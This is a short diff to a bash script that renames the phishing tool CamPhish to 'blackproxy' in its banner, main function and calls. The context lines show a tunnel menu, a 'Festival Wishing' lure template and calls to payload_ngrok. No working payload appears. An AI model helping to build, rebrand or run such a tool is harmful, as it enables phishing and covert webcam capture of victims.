@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish v1.5
+# blackproxy v1.5
 # Powered by BlackProxy
 
 trap 'printf "\n";stop' 2
@@ -14,7 +14,7 @@ printf "\e[1;92m | |( )| | | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  _
 printf "\e[1;92m | || || | | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
 printf "\e[1;92m | () () | | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______) (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf " \e[1;93m CamPhish Ver 1.0 \e[0m \n"
+printf " \e[1;93m blackproxy Ver 1.0 \e[0m \n"
 printf " \e[1;77m remote-coders-2022.netlify.app \e[0m \n"
 
 printf "\n"
@@ -142,7 +142,7 @@ printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
 sleep 1
 clear
 banner
-CamPhish
+blackproxy
 else
 printf "\n-----Choose a template----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
@@ -236,7 +236,7 @@ payload_ngrok
 checkfound
 }
 
-CamPhish() {
+blackproxy() {
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -259,7 +259,7 @@ else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
 clear
-CamPhish
+blackproxy
 fi
 
 }
@@ -306,4 +306,4 @@ checkfound
 
 banner
 dependencies
-CamPhish
+blackproxy
